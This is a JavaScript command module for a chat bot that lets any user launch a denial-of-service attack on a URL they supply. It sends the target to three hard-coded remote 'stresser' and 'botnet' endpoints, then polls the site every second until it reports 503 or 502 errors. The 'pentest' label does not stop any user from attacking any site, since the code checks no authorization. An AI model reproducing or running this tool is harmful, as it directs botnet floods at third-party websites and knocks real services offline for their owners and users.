const axios = require("axios");

const apiEndpoints = [
  "http://sgp1.hmvhostings.com:25694",
  "https://ddos-g01l.onrender.com",
  "https://haji-mix-botnet.onrender.com",
];

module.exports.config = {
  name: "ddos",
  aliases: ["cosmic", "dildos", "botnet", "su", "stresser"],
  type: "pentest",
  role: 0,
  isPrefix: true,
  info: "Perform DILDOS ATTACK on a target URL for pentest or testing purposes.",
  author: "Kenneth Panio",
  cd: 10,
  guide: "ddos http://example.com | ddos stop",
  usage: "[url] or [stop]",
};

module.exports.run = async ({ args, chat, font }) => {
  const targetUrl = args[0];

  if (!targetUrl) {
    return chat.reply(font.thin("Please provide a URL to attack!"));
  }

  let attackInterval = null;
  let errorMessageSent = false;

  const tryAttack = async (apis, index = 0) => {
    if (index >= apis.length) {
      return chat.reply(
        font.thin(
          "All BOTNETs are currently busy, try again later after all attacks are finished!"
        )
      );
    }

    try {
      let response;
      const isStopCommand = targetUrl.toLowerCase() === "stop";

      if (!isStopCommand) {
        const preparingMessage = await chat.reply(
          font.bold("Preparing to attack target...")
        );

        response = await axios.get(
          `${apis[index]}/stresser?url=${encodeURIComponent(targetUrl)}`,
          { timeout: 10000 }
        );

        preparingMessage.delete();

        if (!response.data || response.data.status !== "success") {
          throw new Error("Attack initiation failed");
        }
      } else {
        response = await axios.get(`${apis[index]}/stop`, { timeout: 10000 });

        // Clear any existing interval
        if (attackInterval) {
          clearInterval(attackInterval);
          attackInterval = null;
        }
      }

      await chat.reply(
        font.thin(response.data.message || "Attack initiated successfully!")
      );

      // Only start monitoring if it's not a stop command
      if (!isStopCommand) {
        attackInterval = setInterval(async () => {
          if (errorMessageSent) {
            clearInterval(attackInterval);
            attackInterval = null;
            return;
          }

          try {
            await axios.get(targetUrl.match(/^(https?:\/\/[^\/]+)/)[0], {
              timeout: 5000,
            });
          } catch (error) {
            if (errorMessageSent) {
              clearInterval(attackInterval);
              attackInterval = null;
              return;
            }

            errorMessageSent = true;
            clearInterval(attackInterval);
            attackInterval = null;

            if (error.response) {
              if (error.response.status === 503) {
                await chat.reply(
                  font.thin("Service Unavailable (503).")
                );
              } else if (error.response.status === 502) {
                await chat.reply(
                  font.thin("Bad Gateway (502).")
                );
              }
            }
          }
        }, 1000);
      }
    } catch (error) {
      if (error.code === "ENOTFOUND" || error.code === "ECONNABORTED") {
        // Retry with the next API
        return tryAttack(apis, index + 1);
      } else {
        await chat.reply(
          font.thin(`Failed to initiate attack: ${error.message}`)
        );
      }
    }
  };

  await tryAttack(apiEndpoints);
};